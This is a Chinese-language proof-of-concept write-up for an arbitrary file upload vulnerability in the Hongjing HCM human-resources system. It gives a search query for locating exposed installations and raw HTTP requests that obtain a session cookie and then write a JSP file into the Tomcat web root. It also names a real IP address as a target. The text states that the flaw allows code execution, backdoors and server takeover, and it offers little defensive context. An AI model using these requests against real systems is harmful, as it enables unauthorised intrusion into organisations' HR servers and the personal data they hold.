# 宏景人力资源信息管理系统uploadLogo存在任意文件上传漏洞
宏景人力资源信息管理系统uploadLogo存在任意文件上传漏洞，可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## hunter
```javascript
app.name="宏景 HCM"
```

## poc
1、获取cookie

```java
GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730773798906-c8ff7525-ae32-4aba-9f46-3941013a3ed1.png)

2、获取上传路径

```java
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Cookie: JSESSIONID=3199B98D03F1834F83CDAF45EA079D13
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r

------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="path"


------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="lfType"

0
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif

<%= "bttest1" %>
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="twoFile"; filename=""
Content-Type: image/gif

<%= "bttest1" %>
------WebKitFormBoundaryfjKBvGWJbG07Z02r--
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730773863549-7fb35968-9e26-40b2-ae25-54b275c9d806.png)

3、文件上传

```java
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host: 8.137.169.49:7000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Cookie: JSESSIONID=163CC9FFC3CAAEAFCF07F29B294E99F0
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r

------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="path"

D~3a~5cTomcat~39~5cwebapps~5cROOT~5ctest1.jsp
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="lfType"

0
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif

<%= "bttest1" %>
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="twoFile"; filename=""
Content-Type: image/gif

<%= "bttest1" %>
------WebKitFormBoundaryfjKBvGWJbG07Z02r--
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730773904485-b641a3a5-ca59-4bc8-bfdf-e00f229fbd30.png)

4、访问/test123.jsp

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730773974901-93ca11e0-40df-493e-bee1-ac24a62bea27.png)



